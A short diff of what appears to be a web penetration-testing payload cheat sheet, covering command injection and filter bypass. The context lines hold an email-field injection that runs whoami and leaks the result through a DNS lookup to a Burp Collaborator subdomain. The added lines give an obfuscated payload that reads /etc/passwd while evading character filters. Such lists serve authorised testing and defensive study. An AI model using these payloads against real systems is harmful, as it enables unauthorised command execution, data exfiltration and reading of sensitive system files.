@@ -348,7 +348,8 @@ Bypass white list validation
                                 OS INJECTION
      email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
  
- 
+ E.g.: reading /etc/passwd file:
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
  
  --------------------------------------------------------------------------------------------------
                                 open redirect
